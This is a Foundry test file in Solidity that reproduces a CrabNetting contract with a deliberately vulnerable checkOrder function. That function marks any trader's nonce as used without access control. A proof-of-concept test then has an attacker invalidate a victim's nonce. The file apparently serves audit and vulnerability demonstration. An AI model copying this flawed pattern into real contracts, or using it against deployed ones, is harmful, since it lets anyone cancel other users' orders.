import "forge-std/Test.sol";

// Minimal vulnerable replica (inline)
contract CrabNetting {
    struct Order {
        uint256 bidId;
        address trader;
        uint256 quantity;
        uint256 price;
        bool isBuying;
        uint256 expiry;
        uint256 nonce;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    // store the used flag for a nonce for each address
    mapping(address => mapping(uint256 => bool)) public nonces;

    event NonceTrue(address sender, uint256 nonce);

    // vulnerable external function: anyone can call this to mark a trader's nonce used
    function checkOrder(Order memory _order) external {
        _checkOrder(_order);
    }

    function _checkOrder(Order memory _order) internal {
        // NOTE: _useNonce marks the nonce used BEFORE any checks and there are no access controls
        _useNonce(_order.trader, _order.nonce);
        // original contract does signature checks here; omitted in this minimal replica
    }

    function _useNonce(address _trader, uint256 _nonce) internal {
        nonces[_trader][_nonce] = true;
        emit NonceTrue(_trader, _nonce);
    }
}

contract CrabNettingTest is Test {
    CrabNetting target;
    address attacker;
    address victim;

    function setUp() public {
        target = new CrabNetting();
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
    }

    function test_attacker_exploits_checkOrder() public {
        CrabNetting.Order memory o = CrabNetting.Order({
            bidId: 0,
            trader: victim,
            quantity: 0,
            price: 0,
            isBuying: false,
            expiry: 0,
            nonce: 1,
            v: 0,
            r: bytes32(0),
            s: bytes32(0)
        });

        // attacker calls checkOrder for someone else's order, marking the victim's nonce used
        vm.prank(attacker);
        target.checkOrder(o);

        // assert the nonce for the victim was marked true
        assertTrue(target.nonces(victim, 1));
    }
}

